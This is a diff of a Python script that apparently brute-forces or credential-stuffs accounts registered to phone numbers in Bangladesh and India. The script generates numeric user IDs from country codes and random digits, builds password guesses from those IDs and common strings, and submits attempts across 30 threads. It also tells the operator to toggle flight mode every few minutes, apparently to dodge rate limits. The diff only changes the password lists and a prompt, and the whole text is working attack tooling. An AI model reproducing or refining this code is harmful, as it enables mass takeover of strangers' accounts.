@@ -354,7 +354,7 @@ def bd():
 			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE');linex()
 			for psx in user:
 				uid = code+psx
-				passlist = [psx,uid,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
+				passlist = [uid[:6],uid[:8],uid,uid[2:],uid[4:],'57273200','59039200','57575751']
 				if mthd in ['1','01']:
 					habib.submit(rndm1,uid,passlist)
 				if mthd in ['2','02']:
@@ -373,8 +373,6 @@ def bd():
 def india():
 		user=[]
 		clear()
-		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 9815 | 9814 | 9861 | 9840  ');linex()
-		cod = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
 		code = str(random.randint(6,9))
 		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
 		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
@@ -387,14 +385,14 @@ def india():
 		with tred(max_workers=30) as habib:	
 			clear()
 			tl = str(len(user))
-			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE :{A} {code} ')
+			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE :{faltu} {black}wish luck {pvt} ')
 			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ID :{A} {tl} ')
 			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE [ON/OF] YOUR FLIGHT MODE');linex()
 			for psx in user:
 				name = ''.join(random.choice(string.digits) for _ in range(3))
 				cod = ''.join(random.choice(string.digits) for _ in range(3))
 				uid = code+name+cod+psx
-				passlist = [uid[:6],uid[:8],uid,uid[2:],uid[4:],'57273200','59039200','57575751']
+				passlist = [uid[:6],uid[:8]]
 				if mthd in ['1','01']:
 					habib.submit(rndm1,uid,passlist)
 				if mthd in ['2','02']:
